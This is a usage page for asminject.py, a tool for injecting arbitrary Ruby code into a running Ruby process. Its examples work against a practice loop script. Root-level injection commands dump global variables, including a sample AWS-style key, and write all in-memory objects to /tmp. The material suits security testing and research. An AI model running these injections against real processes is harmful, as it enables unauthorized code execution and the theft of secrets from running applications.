# asminject.py examples - Ruby
* [Execute arbitrary Ruby code inside an existing Ruby process](#execute-arbitrary-ruby-code-inside-an-existing-ruby-process)
* [Write all global variables to standard out](#write-all-global-variables-to-standard-out)
* [Write a text representation of all objects in memory to disk](#write-a-text-representation-of-all-objects-in-memory-to-disk)

## Execute arbitrary Ruby code inside an existing Ruby process

The `execute_ruby_code.s` payload currently has a few limitations:

* No ability to require additional Ruby gems
* The targeted process will lock up after the injected code finishes executing

This payload requires one variable: `rubycode`, which should contain the Ruby code you want to execute in the existing Ruby process.

This payload requires relative offsets for the `libruby` shared library used by the target process.

In one terminal window, launch the practice Ruby loop, e.g.:

```
$ ruby practice/ruby_loop.rb

2022-05-12T13:40:51-0700 - Loop count 0
2022-05-12T13:40:56-0700 - Loop count 1
2022-05-12T13:41:01-0700 - Loop count 2
```

In a separate window, find the target process, and inject the code:

```
# ps auxww | grep ruby | grep -v grep

root     2037714  [...] ruby practice/ruby_loop.rb

# python3 ./asminject.py 2037714 execute_ruby_code.s \
   --relative-offsets-from-binaries \
   --var rubycode "puts(\\\"Injected Ruby code\\\")"
```

In the first window, note that the loop is interrupted by the injected code, but fails to continue executing the original loop even though the process remains running:

```
2022-05-12T13:44:41-07:00 - Loop count 7
2022-05-12T13:44:46-07:00 - Loop count 8
Injected Ruby code
```

## Write all global variables to standard out

Use [the following Ruby code, which was borrowed from this Gist by Dmitry Yakimenko](https://gist.github.com/detunized/1620634)

```
global_variables.sort.each do |name|; puts "#{name}: #{eval "#{name}.inspect"}
```

e.g.

```
# python3 ./asminject.py 84955 execute_ruby_code.s \
   --relative-offsets-from-binaries \
   --var rubycode "global_variables.sort.each do |name|; puts \\\"#{name}: #{eval \\\"#{name}.inspect\\\"}\\\"; end"
```

Example output:

```
2022-06-07T13:50:06-07:00 - Loop count 10
2022-06-07T13:50:11-07:00 - Loop count 11
$!: nil
...omitted for brevity...
$$: 84955
...omitted for brevity...
$0: "practice/ruby_loop.rb"
...omitted for brevity...
$example_global_var_1: "AKIASADF9370235SUAS0"
$example_global_var_2: "This value should not be disclosed"

```

## Write a text representation of all objects in memory to disk

Use the following Ruby code:

```
$obj_dump_counter = 0; ObjectSpace.each_object{|e| File.open("/tmp/rubydump-#{$obj_dump_counter}.dat", "wb") { |file| file.write(e); $obj_dump_counter += 1; }}
```

e.g.

```
python3 ./asminject.py 163017 execute_ruby_code.s \
   --relative-offsets-from-binaries \
   --var rubycode '$obj_dump_counter = 0; ObjectSpace.each_object{|e| File.open(\"/tmp/rubydump-#{$obj_dump_counter}.dat\", \"wb\") { |file| file.write(e); $obj_dump_counter += 1; }}'
```